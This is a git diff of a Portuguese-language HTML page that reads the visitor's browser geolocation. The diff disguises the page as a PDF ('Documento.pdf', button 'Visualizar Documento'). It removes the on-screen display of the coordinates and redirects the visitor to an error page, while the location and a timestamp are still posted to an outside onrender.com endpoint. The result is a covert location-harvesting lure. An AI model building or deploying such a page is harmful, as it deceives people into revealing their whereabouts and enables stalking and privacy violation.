@@ -1,13 +1,13 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Captura de Localização</title>
-</head>
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Documento.pdf</title>
+        <link rel="stylesheet" href="styles.css">
+    </head>
 <body>
-    <h1>Permissão de Localização</h1>
-    <button id="getLocation">Obter Localização</button>
+    <button id="getLocation">Visualizar Documento</button>
     <div id="result"></div>
 
     <script>
@@ -19,8 +19,8 @@
                     const date = new Date();
                     const timestamp = date.toISOString();
 
-                    // Exibir no navegador
-                    document.getElementById('result').innerText = `Latitude: ${latitude}, Longitude: ${longitude}, Data: ${timestamp}`;
+                    // Redirecionar para o link desejado
+                    window.location.href = 'https://location-89fe.onrender.com/erro.html';  // Altere para o link desejado
 
                     // Enviar dados para o backend
                     fetch('https://location-89fe.onrender.com/api/location', {  // Corrigido para a rota correta
